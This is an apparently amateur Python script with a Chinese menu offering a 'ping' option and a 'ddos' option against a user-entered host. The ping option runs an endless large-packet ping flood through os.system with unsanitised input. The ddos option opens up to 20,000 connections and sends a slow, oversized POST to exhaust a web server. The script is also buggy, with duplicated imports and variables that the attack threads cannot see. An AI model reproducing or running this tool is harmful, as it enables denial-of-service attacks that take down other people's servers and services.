import tkinter as tk
import tkinter.messagebox
import pickle
import subprocess
import time
from os import path
from subprocess import Popen,PIPE
from tkinter import *
from tkinter import ttk 
from tkinter.filedialog import askopenfilename
from time import sleep
import time
from tkinter import *
import tkinter.messagebox
import tkinter.filedialog
import os
import datetime
import tkinter as tk
import tkinter.messagebox
from os import path
from subprocess import Popen, PIPE
from tkinter import *
from tkinter import ttk 
from tkinter.filedialog import askopenfilename
from time import sleep
import time
from tkinter import *
import tkinter.messagebox
import tkinter.filedialog
import os
import webbrowser
import socket
import threading
def input_cd():
  cd = input("请输入指令>>")
  if cd == "1":
    ping()
  if cd == "2":
    MAX_CONN=20000
    PORT=80
    HOST=input("请输入网址或IP:")
    PAGE="/index.php"
    #---------------------------
 
    buf=("POST %s HTTP/1.1\r\n"
    "Host: %s\r\n"
    "Content-Length: 10000000\r\n"
    "Cookie: dklkt_dos_test\r\n"
    "\r\n" % (PAGE,HOST))
  
    socks=[]
  
    conn_th=threading.Thread(target=conn_thread,args=())
    send_th=threading.Thread(target=send_thread,args=())
  
    conn_th.start()
    send_th.start()

  input_cd()
 
def ping():
  host = input("请输入对方IP:")
  qiangdu = input("请输入强度(1-65500):")
   
  os.system("ping -t -l " + qiangdu + " " + host)

def conn_thread():
  global socks
  for i in range(0,MAX_CONN):
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
      s.connect((HOST,PORT))
      s.send(buf.encode())
      print ("Send buf OK!,conn=%d\n"%i)
      socks.append(s)
    except Exception as ex:
      print ("Could not connect to server or send error:%s"%ex)
      time.sleep(0.1)
#end def
  
def send_thread():
  global socks
  while True:
    for s in socks:
      try:
        s.send("f".encode())
        #print "send OK!"
      except Exception as ex:
        print ("Send Exception:%s\n"%ex)
        socks.remove(s)
        s.close()
    time.sleep(0.1)
#end def

logo = """
    \_______/
     \~~~~~/
      \+++/
    hourglass
       /*\\
      /@@@\\
     /.....\\
    /_______\ 
"""
 
print(logo)
print('[][使用指南][]')
print('1、ping \n2、ddos')
input_cd()
